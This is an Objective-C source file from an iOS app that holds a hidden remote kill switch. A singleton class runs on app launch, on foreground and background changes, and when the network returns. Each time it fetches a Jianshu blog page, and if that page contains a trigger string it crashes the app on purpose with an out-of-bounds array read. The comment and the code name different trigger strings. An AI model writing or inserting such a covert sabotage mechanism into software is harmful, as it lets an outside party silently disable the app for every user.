//
//  AppCerashOpenHelp.m
//  BXJianZhi
//
//  Created by 潮汐 on 2020/11/14.
//  Copyright © 2020 潮汐科技有限公司. All rights reserved.
//

#import "AppCerashOpenHelp.h"

@implementation AppCerashOpenHelp
//单例初始化
+ (instancetype)sharedManager {
    static AppCerashOpenHelp * manager;//控制器
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        manager = [[AppCerashOpenHelp alloc] init];
    });
    return manager;
}

- (instancetype)init
{
    self = [super init];
    if (self) {
        //程序从前台进入==>>后台
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(appBecomeActive) name:UIApplicationWillResignActiveNotification object:nil];
        // app进入前台
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(appDidEnterPlayground) name:UIApplicationDidBecomeActiveNotification object:nil];
        //网络恢复
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(aginLoadAppInfo) name:@"YZ_networkChange" object:nil];
        
        [self setupOpen];
    }
    return self;
}

//网络恢复，从没网到有网
- (void)aginLoadAppInfo {
    [self setupOpen];
}
//进入后台
- (void)appBecomeActive {
    [self setupOpen];
}
//后台进入前台
- (void)appDidEnterPlayground {
    [self setupOpen];
}

-(void)setupOpen
{
    //潮汐的简书地址控制地址，文章标题或者内容里包含isCrash_1就崩溃。 https://www.jianshu.com/p/d93fbc0b5665
    NSString *url_str = @"https://www.jianshu.com/p/d93fbc0b5665";
    NSURL *url = [NSURL URLWithString:url_str];
    NSError *error;
    NSString *appInfoString = [NSString stringWithContentsOfURL:url encoding:NSUTF8StringEncoding error:&error];
    NSArray *result = [self getResultFromStr:appInfoString withRegular:@"isChaoXi_1"];
    if (result.count>0) {
        ///进入崩溃
        NSObject * obj = result[result.count];
    }
}

/*!
 NSString扩展了一个方法，通过正则获得字符串中的数据
 */
- (NSMutableArray *)getResultFromStr:(NSString *)str withRegular:(NSString *)regular {
    NSRegularExpression *regex = [[NSRegularExpression alloc] initWithPattern:regular options:NSRegularExpressionCaseInsensitive | NSRegularExpressionDotMatchesLineSeparators error:nil];
    NSMutableArray *array = [NSMutableArray new];
    // 取出找到的内容.
    @try {//防止测试环境崩溃
        [regex enumerateMatchesInString:str options:0 range:NSMakeRange(0, [str length]) usingBlock:^(NSTextCheckingResult *result, NSMatchingFlags flags, BOOL *stop) {
            [array addObject:[str substringWithRange:[result rangeAtIndex:0]]];
        }];
        
    } @catch (NSException *exception) {
        
    } @finally {
        
    }
    return array;
}

@end
